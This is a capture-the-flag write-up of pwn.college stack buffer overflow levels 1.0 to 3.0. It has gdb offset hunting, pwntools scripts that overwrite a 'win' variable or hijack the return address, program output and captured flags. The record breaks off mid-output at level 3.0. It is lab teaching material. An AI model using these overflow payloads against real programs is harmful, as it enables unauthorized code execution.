# Memory Errors

## Level1.0

### Challenge

```
Overflow a buffer on the stack to set the right conditions to obtain the flag!
```


### Solving

Upon running the challenge first we see this ->

```shell
hacker@memory-errors~level1-0:/challenge$ ./babymem-level-1-0 
###
### Welcome to ./babymem-level-1-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffecb1a5250 (rsp+0x0000) | a0 36 78 55 49 78 00 00 | 0x00007849557836a0 |
| 0x00007ffecb1a5258 (rsp+0x0008) | 08 64 1a cb fe 7f 00 00 | 0x00007ffecb1a6408 |
| 0x00007ffecb1a5260 (rsp+0x0010) | f8 63 1a cb fe 7f 00 00 | 0x00007ffecb1a63f8 |
| 0x00007ffecb1a5268 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffecb1a5270 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a5278 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a5280 (rsp+0x0030) | 90 52 1a cb fe 7f 00 00 | 0x00007ffecb1a5290 |
| 0x00007ffecb1a5288 (rsp+0x0038) | ac 52 1a cb fe 7f 00 00 | 0x00007ffecb1a52ac |
| 0x00007ffecb1a5290 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a5298 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a52a0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a52a8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a52b0 (rsp+0x0060) | 00 63 1a cb fe 7f 00 00 | 0x00007ffecb1a6300 |
| 0x00007ffecb1a52b8 (rsp+0x0068) | 00 16 90 f3 ce c2 5f a3 | 0xa35fc2cef3901600 |
| 0x00007ffecb1a52c0 (rsp+0x0070) | 00 63 1a cb fe 7f 00 00 | 0x00007ffecb1a6300 |
| 0x00007ffecb1a52c8 (rsp+0x0078) | f9 45 12 bf f0 61 00 00 | 0x000061f0bf1245f9 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffecb1a5250, and our base pointer points to 0x7ffecb1a52c0.
This means that we have (decimal) 16 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 128 bytes.
The input buffer begins at 0x7ffecb1a5290, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 28 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffecb1a52ac, 28 bytes after the start of your input buffer.

Payload size: 1
You have chosen to send 1 bytes of input!
This will allow you to write from 0x7ffecb1a5290 (the start of the input buffer)
right up to (but not including) 0x7ffecb1a5291 (which is -27 bytes beyond the end of the buffer).
Send your payload (up to 1 bytes)!
t
You sent 1 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffecb1a5250 (rsp+0x0000) | a0 36 78 55 49 78 00 00 | 0x00007849557836a0 |
| 0x00007ffecb1a5258 (rsp+0x0008) | 08 64 1a cb fe 7f 00 00 | 0x00007ffecb1a6408 |
| 0x00007ffecb1a5260 (rsp+0x0010) | f8 63 1a cb fe 7f 00 00 | 0x00007ffecb1a63f8 |
| 0x00007ffecb1a5268 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffecb1a5270 (rsp+0x0020) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffecb1a5278 (rsp+0x0028) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffecb1a5280 (rsp+0x0030) | 90 52 1a cb fe 7f 00 00 | 0x00007ffecb1a5290 |
| 0x00007ffecb1a5288 (rsp+0x0038) | ac 52 1a cb fe 7f 00 00 | 0x00007ffecb1a52ac |
| 0x00007ffecb1a5290 (rsp+0x0040) | 74 00 00 00 00 00 00 00 | 0x0000000000000074 |
| 0x00007ffecb1a5298 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a52a0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a52a8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffecb1a52b0 (rsp+0x0060) | 00 63 1a cb fe 7f 00 00 | 0x00007ffecb1a6300 |
| 0x00007ffecb1a52b8 (rsp+0x0068) | 00 16 90 f3 ce c2 5f a3 | 0xa35fc2cef3901600 |
| 0x00007ffecb1a52c0 (rsp+0x0070) | 00 63 1a cb fe 7f 00 00 | 0x00007ffecb1a6300 |
| 0x00007ffecb1a52c8 (rsp+0x0078) | f9 45 12 bf f0 61 00 00 | 0x000061f0bf1245f9 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffecb1a5290
- the saved frame pointer (of main) is at 0x7ffecb1a52c0
- the saved return address (previously to main) is at 0x7ffecb1a52c8
- the saved return address is now pointing to 0x61f0bf1245f9.
- the canary is stored at 0x7ffecb1a52b8.
- the canary value is now 0xa35fc2cef3901600.
- the address of the win variable is 0x7ffecb1a52ac.
- the value of the win variable is 0x0.

Goodbye!
### Goodbye!
hacker@memory-errors~level1-0:/challenge$ 
```

We can note that the input win variable starts 28 bytes after the input buffer meaning we can just buffer up 28 values then enter a value to change the win variable, which is python3 -c ("40" + "A"*28 + "A")

```shell
hacker@memory-errors~level1-0:/challenge$   
###
### Welcome to ./babymem-level-1-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe6350b110 (rsp+0x0000) | a0 66 2d c2 e5 79 00 00 | 0x000079e5c22d66a0 |
| 0x00007ffe6350b118 (rsp+0x0008) | c8 c2 50 63 fe 7f 00 00 | 0x00007ffe6350c2c8 |
| 0x00007ffe6350b120 (rsp+0x0010) | b8 c2 50 63 fe 7f 00 00 | 0x00007ffe6350c2b8 |
| 0x00007ffe6350b128 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe6350b130 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe6350b138 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe6350b140 (rsp+0x0030) | 50 b1 50 63 fe 7f 00 00 | 0x00007ffe6350b150 |
| 0x00007ffe6350b148 (rsp+0x0038) | 6c b1 50 63 fe 7f 00 00 | 0x00007ffe6350b16c |
| 0x00007ffe6350b150 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe6350b158 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe6350b160 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe6350b168 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe6350b170 (rsp+0x0060) | c0 c1 50 63 fe 7f 00 00 | 0x00007ffe6350c1c0 |
| 0x00007ffe6350b178 (rsp+0x0068) | 00 3f 5f 00 f3 f9 a2 f8 | 0xf8a2f9f3005f3f00 |
| 0x00007ffe6350b180 (rsp+0x0070) | c0 c1 50 63 fe 7f 00 00 | 0x00007ffe6350c1c0 |
| 0x00007ffe6350b188 (rsp+0x0078) | f9 95 98 b2 26 60 00 00 | 0x00006026b29895f9 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe6350b110, and our base pointer points to 0x7ffe6350b180.
This means that we have (decimal) 16 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 128 bytes.
The input buffer begins at 0x7ffe6350b150, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 28 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffe6350b16c, 28 bytes after the start of your input buffer.

Payload size: You have chosen to send 29 bytes of input!
This will allow you to write from 0x7ffe6350b150 (the start of the input buffer)
right up to (but not including) 0x7ffe6350b16d (which is 1 bytes beyond the end of the buffer).
Send your payload (up to 29 bytes)!
You sent 29 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe6350b110 (rsp+0x0000) | a0 66 2d c2 e5 79 00 00 | 0x000079e5c22d66a0 |
| 0x00007ffe6350b118 (rsp+0x0008) | c8 c2 50 63 fe 7f 00 00 | 0x00007ffe6350c2c8 |
| 0x00007ffe6350b120 (rsp+0x0010) | b8 c2 50 63 fe 7f 00 00 | 0x00007ffe6350c2b8 |
| 0x00007ffe6350b128 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe6350b130 (rsp+0x0020) | 00 00 00 00 1d 00 00 00 | 0x0000001d00000000 |
| 0x00007ffe6350b138 (rsp+0x0028) | 1d 00 00 00 00 00 00 00 | 0x000000000000001d |
| 0x00007ffe6350b140 (rsp+0x0030) | 50 b1 50 63 fe 7f 00 00 | 0x00007ffe6350b150 |
| 0x00007ffe6350b148 (rsp+0x0038) | 6c b1 50 63 fe 7f 00 00 | 0x00007ffe6350b16c |
| 0x00007ffe6350b150 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe6350b158 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe6350b160 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe6350b168 (rsp+0x0058) | 41 41 41 41 0a 00 00 00 | 0x0000000a41414141 |
| 0x00007ffe6350b170 (rsp+0x0060) | c0 c1 50 63 fe 7f 00 00 | 0x00007ffe6350c1c0 |
| 0x00007ffe6350b178 (rsp+0x0068) | 00 3f 5f 00 f3 f9 a2 f8 | 0xf8a2f9f3005f3f00 |
| 0x00007ffe6350b180 (rsp+0x0070) | c0 c1 50 63 fe 7f 00 00 | 0x00007ffe6350c1c0 |
| 0x00007ffe6350b188 (rsp+0x0078) | f9 95 98 b2 26 60 00 00 | 0x00006026b29895f9 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffe6350b150
- the saved frame pointer (of main) is at 0x7ffe6350b180
- the saved return address (previously to main) is at 0x7ffe6350b188
- the saved return address is now pointing to 0x6026b29895f9.
- the canary is stored at 0x7ffe6350b178.
- the canary value is now 0xf8a2f9f3005f3f00.
- the address of the win variable is 0x7ffe6350b16c.
- the value of the win variable is 0xa.

You win! Here is your flag:
pwn.college{wJjJXbJ05uwKwFkAdxtYtOrZ4Td.0VO4IDL4czN0czW}


Goodbye!
### Goodbye!
```

### Flag

> pwn.college{wJjJXbJ05uwKwFkAdxtYtOrZ4Td.0VO4IDL4czN0czW}

---

## Level1.1

### Challenge

```
Overflow a buffer on the stack to set the right conditions to obtain the flag!
```

### Solving

Unlike the previous challenge where they tell us where the win variable is located it seems as though we must locate it ourselves ;-;

Luckily I came across this cool thread on the pwn college discord explaining the basics on what to do [thread](https://discord.com/channels/750635557666816031/1233962791065489480) We open up both programmes with IDA and gdb, this is because the breakpoints are easier to make 



We first want to set a breakpoint at the read statement as this allows us to see where our buffer's address is so by breaking at this we can then inspect the variables. This has a offset of ``challenge+c8``

Over This breakpoint is reached we can inspect both the address of the buff variable and the address of the win variable.


Next an argument passing the string to ``read`` is from rsi hence we can just view that directly by doing ``x/gx $rsi`` hence once we have done that we can subtract the two addresses.

Now once we break here we first realise the win variable is a pointer to ``v7`` Which has an offset of ``rsp+0x98``

Now to calculate the offset we do the ``address of the win variable - buf address`` -> ``0x7ffefa3aa8b8 - 0x7ffefa3aa860`` giving us 88

```shell
hacker@memory-errors~level1-1:~$ gdb /challenge/babymem-level-1-1 
GNU gdb (GDB) 14.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /challenge/babymem-level-1-1...
(No debugging symbols found in /challenge/babymem-level-1-1)
(gdb) set disassembly-flavor intel
(gdb) start
Temporary breakpoint 1 at 0x1bf2
Starting program: /challenge/babymem-level-1-1 

Temporary breakpoint 1, 0x000055b780e08bf2 in main ()
(gdb) b *challenge+0xc8
Breakpoint 2 at 0x55b780e08b6f
(gdb) c
Continuing.
###
### Welcome to /challenge/babymem-level-1-1!
###

Payload size: 100
Send your payload (up to 100 bytes)!

Breakpoint 2, 0x000055b780e08b6f in challenge ()
(gdb) x/gx $rsi
0x7ffefa3aa860:	0x0000000000000000
(gdb) x/wx $rsp+98
0x7ffefa3aa882:	0x00000000
(gdb) x/wx $rsp+38
0x7ffefa3aa846:	0x00640000
(gdb) x/wx $rsp+0x98
0x7ffefa3aa8b8:	0x00000000
(gdb) p 0x7ffefa3aa8b8 - 0x7ffefa3aa860
$1 = 88
(gdb) 
```

```shell
hacker@memory-errors~level1-1:/challenge$ python -c 'print("100" + "A"*88 + "A")' | ./babymem-level-1-1
###
### Welcome to ./babymem-level-1-1!
###

Payload size: Send your payload (up to 100 bytes)!
You win! Here is your flag:
pwn.college{I_-PoobW6rONsnp96dCB4_OtMbu.0FM5IDL4czN0czW}


Goodbye!
### Goodbye!
hacker@memory-errors~level1-1:/challenge$ 
```


### Flag

> pwn.college{I_-PoobW6rONsnp96dCB4_OtMbu.0FM5IDL4czN0czW}

---

## level2.0

### Challenge

```
Overflow a buffer on the stack to set trickier conditions to obtain the flag!
```

### Solving


After running it a couple times it seems as though we need to buffer 40 times before ``0x0039746a``. Now we have to keep in mind the endianess before sending this payload hence making us send ``\6a\74\39\x00``. -> . However trying this proved that it was not working and upon again consulting the discord server threads i was lead to using pwntools to send the input.

Hence i made dis cool script to do it.

```python
from pwn import *

p = process('/challenge/babymem-level-2-0')

p.sendline(b"100")

payload = b"A" * 40 + b"\x6a\x74\x39\00"
p.sendline(payload)

p.interactive()
```

```shell
hacker@memory-errors~level2-0:~$ python3 script.py
[+] Starting local process '/challenge/babymem-level-2-0': pid 6129
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-2-0' stopped with exit code 0 (pid 6129)
###
### Welcome to /challenge/babymem-level-2-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe2b59acd0 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffe2b59acd8 (rsp+0x0008) | 98 be 59 2b fe 7f 00 00 | 0x00007ffe2b59be98 |
| 0x00007ffe2b59ace0 (rsp+0x0010) | 88 be 59 2b fe 7f 00 00 | 0x00007ffe2b59be88 |
| 0x00007ffe2b59ace8 (rsp+0x0018) | 20 f0 ad 0f 01 00 00 00 | 0x000000010fadf020 |
| 0x00007ffe2b59acf0 (rsp+0x0020) | 40 85 f0 c6 bb 70 00 00 | 0x000070bbc6f08540 |
| 0x00007ffe2b59acf8 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe2b59ad00 (rsp+0x0030) | 10 ad 59 2b fe 7f 00 00 | 0x00007ffe2b59ad10 |
| 0x00007ffe2b59ad08 (rsp+0x0038) | 38 ad 59 2b fe 7f 00 00 | 0x00007ffe2b59ad38 |
| 0x00007ffe2b59ad10 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe2b59ad18 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe2b59ad20 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe2b59ad28 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe2b59ad30 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe2b59ad38 (rsp+0x0068) | 00 00 00 00 2b 5e 00 00 | 0x00005e2b00000000 |
| 0x00007ffe2b59ad40 (rsp+0x0070) | 90 bd 59 2b fe 7f 00 00 | 0x00007ffe2b59bd90 |
| 0x00007ffe2b59ad48 (rsp+0x0078) | 00 96 ca 9d 85 c4 65 de | 0xde65c4859dca9600 |
| 0x00007ffe2b59ad50 (rsp+0x0080) | 90 bd 59 2b fe 7f 00 00 | 0x00007ffe2b59bd90 |
| 0x00007ffe2b59ad58 (rsp+0x0088) | b9 c1 ad 0f 2b 5e 00 00 | 0x00005e2b0fadc1b9 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe2b59acd0, and our base pointer points to 0x7ffe2b59ad50.
This means that we have (decimal) 18 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 144 bytes.
The input buffer begins at 0x7ffe2b59ad10, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 37 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, if you can set variable to 0x0039746a, the flag will be printed.
You can change this variable by overflowing the input buffer, but keep endianness in mind!
The "win" variable is stored at 0x7ffe2b59ad38, 40 bytes after the start of your input buffer.

Payload size: You have chosen to send 100 bytes of input!
This will allow you to write from 0x7ffe2b59ad10 (the start of the input buffer)
right up to (but not including) 0x7ffe2b59ad74 (which is 63 bytes beyond the end of the buffer).
Send your payload (up to 100 bytes)!
You sent 45 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe2b59acd0 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffe2b59acd8 (rsp+0x0008) | 98 be 59 2b fe 7f 00 00 | 0x00007ffe2b59be98 |
| 0x00007ffe2b59ace0 (rsp+0x0010) | 88 be 59 2b fe 7f 00 00 | 0x00007ffe2b59be88 |
| 0x00007ffe2b59ace8 (rsp+0x0018) | 20 f0 ad 0f 01 00 00 00 | 0x000000010fadf020 |
| 0x00007ffe2b59acf0 (rsp+0x0020) | 40 85 f0 c6 2d 00 00 00 | 0x0000002dc6f08540 |
| 0x00007ffe2b59acf8 (rsp+0x0028) | 64 00 00 00 00 00 00 00 | 0x0000000000000064 |
| 0x00007ffe2b59ad00 (rsp+0x0030) | 10 ad 59 2b fe 7f 00 00 | 0x00007ffe2b59ad10 |
| 0x00007ffe2b59ad08 (rsp+0x0038) | 38 ad 59 2b fe 7f 00 00 | 0x00007ffe2b59ad38 |
| 0x00007ffe2b59ad10 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe2b59ad18 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe2b59ad20 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe2b59ad28 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe2b59ad30 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe2b59ad38 (rsp+0x0068) | 6a 74 39 00 0a 5e 00 00 | 0x00005e0a0039746a |
| 0x00007ffe2b59ad40 (rsp+0x0070) | 90 bd 59 2b fe 7f 00 00 | 0x00007ffe2b59bd90 |
| 0x00007ffe2b59ad48 (rsp+0x0078) | 00 96 ca 9d 85 c4 65 de | 0xde65c4859dca9600 |
| 0x00007ffe2b59ad50 (rsp+0x0080) | 90 bd 59 2b fe 7f 00 00 | 0x00007ffe2b59bd90 |
| 0x00007ffe2b59ad58 (rsp+0x0088) | b9 c1 ad 0f 2b 5e 00 00 | 0x00005e2b0fadc1b9 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffe2b59ad10
- the saved frame pointer (of main) is at 0x7ffe2b59ad50
- the saved return address (previously to main) is at 0x7ffe2b59ad58
- the saved return address is now pointing to 0x5e2b0fadc1b9.
- the canary is stored at 0x7ffe2b59ad48.
- the canary value is now 0xde65c4859dca9600.
- the address of the win variable is 0x7ffe2b59ad38.
- the value of the win variable is 0x39746a.

You win! Here is your flag:
pwn.college{k_5_3oFx9ub4Bd-XepAJAjlERI8.ddTNzMDL4czN0czW}


Goodbye!
### Goodbye!
[*] Got EOF while reading in interactive
```
### Flag

> pwn.college{k_5_3oFx9ub4Bd-XepAJAjlERI8.ddTNzMDL4czN0czW}

---

## level2.1

### Challenge

```
Overflow a buffer on the stack to set trickier conditions to obtain the flag!
```
### Solving

Now like the previous ``.1`` challenge we are unable to see what we have to enter into our win condition this time or the offset that we have meaning we get to go another round with gdb ;-;


Looking through gdb we first check what the hex value is that we are supposed to enter which is -> ``0x1355b537`` hence our final payload to put in the win variable is ``b"\x37\xb5\x55\x13"``


Now let's start looking for the offset between the ``buff`` and our win ``Variable``. However we find out these have the same address now looking at the 2.

However looking back at the variable declarations we see a very cool thing ``v5 = &v6[116];``, v5 is set to point at the last 4 bytes of the v6 string. hence our winning variable will be post 116 hence we overflow it from that offset.

```python
from pwn import *

p = process('/challenge/babymem-level-2-1')

p.sendline(b"130")

payload = b"A" * 116 + b"\x37\xb5\x55\x13"
p.sendline(payload)

p.interactive()
```

```shell
hacker@memory-errors~level2-1:~$ python3 finalscript.py 
[+] Starting local process '/challenge/babymem-level-2-1': pid 1577
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-2-1' stopped with exit code -6 (SIGABRT) (pid 1577)
###
### Welcome to /challenge/babymem-level-2-1!
###

Payload size: Send your payload (up to 130 bytes)!
You win! Here is your flag:
pwn.college{snxpt09MNYnlf-jatkL-XviABjv.dhTNzMDL4czN0czW}


Goodbye!
*** stack smashing detected ***: terminated
[*] Got EOF while reading in interactive
$  
```

### Flag

> pwn.college{snxpt09MNYnlf-jatkL-XviABjv.dhTNzMDL4czN0czW}

---

## level3.0


### Challenge

```
```

### Solving


In this challenge they have removed the variable that we used to check for ``win`` now instead they are asking us to overflow to the return address where we can then change it to the address of ``win``

```python
from pwn import *

p = process('/challenge/babymem-level-3-0')

p.sendline(b"200")

payload = b"A" * 152 + b"\xdf\x1c\x40\x00"
p.send(payload)

p.interactive()
```

```shell
hacker@memory-errors~level3-0:~$ python3 script.py
[+] Starting local process '/challenge/babymem-level-3-0': pid 836
[*] Switching to interactive mode
[*] Process '/challenge/babymem-level-3-0' stopped with exit code -11 (SIGSEGV) (pid 836)
###
### Welcome to /challenge/babymem-level-3-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe412b70f0 (rsp+0x0000) | 00 71 2b 41 fe 7f 00 00 | 0x00007ffe412b7100 |
| 0x00007ffe412b70f8 (rsp+0x0008) | e8 82 2b 41 fe 7f 00 00 | 0x00007ffe412b82e8 |
| 0x00007ffe412b7100 (rsp+0x0010) | d8 82 2b 41 fe 7f 00 00 | 0x00007ffe412b82d8 |
| 0x00007ffe412b7108 (rsp+0x0018) | a0 86 a3 10 01 00 00 00 | 0x0000000110a386a0 |
| 0x00007ffe412b7110 (rsp+0x0020) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffe412b7118 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7120 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7128 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7130 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7138 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7140 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7148 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7150 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7158 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7160 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7168 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7170 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7178 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7180 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7188 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7190 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe412b7198 (rsp+0x00a8) | 80 24 40 00 00 00 00 00 | 0x0000000000402480 |
| 0x00007ffe412b71a0 (rsp+0x00b0) | e0 81 2b 41 fe 7f 00 00 | 0x00007ffe412b81e0 |
| 0x00007ffe412b71a8 (rsp+0x00b8) | 20 71 2b 41 fe 7f 00 00 | 0x00007ffe412b7120 |
| 0x00007ffe412b71b0 (rsp+0x00c0) | e0 81 2b 41 fe 7f 00 00 | 0x00007ffe412b81e0 |
| 0x00007ffe412b71b8 (rsp+0x00c8) | 60 24 40 00 00 00 00 00 | 0x0000000000402460 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe412b70f0, and our base pointer points to 0x7ffe412b71b0.
This means that we have (decimal) 26 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 208 bytes.
The input buffer begins at 0x7ffe412b7120, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 117 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffe412b71b8, 152 bytes after the start of your input buffer.
That means that you will need to input at least 160 bytes (117 to fill the buffer,
35 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: You have chosen to send 200 bytes of input!
This will allow you to write from 0x7ffe412b7120 (the start of the input buffer)
right up to (but not including) 0x7ffe412b71e8 (which is 83 bytes beyond the end of the buffer).
Of these, you will overwrite 48 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffe412b71b8, 152 bytes past the start of the input buffer)
with 0x401cdf, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to 200 bytes)!
You sent 157 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe412b70f0 (rsp+0x0000) | 00 71 2b 41 fe 7f 00 00 | 0x00007ffe412b7100 |
| 0x00007ffe412b70f8 (rsp+0x0008) | e8 82 2b 41 fe 7f 00 00 | 0x00007ffe412b82e8 |
| 0x00007ffe412b7100 (rsp+0x0010) | d8 82 2b 41 fe 7f 00 00 | 0x00007ffe412b82d8 |
| 0x00007ffe412b7108 (rsp+0x0018) | a0 86 a3 10 01 00 00 00 | 0x0000000110a386a0 |
| 0x00007ffe412b7110 (rsp+0x0020) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffe412b7118 (rsp+0x0028) | c8 00 00 00 00 00 00 00 | 0x00000000000000c8 |
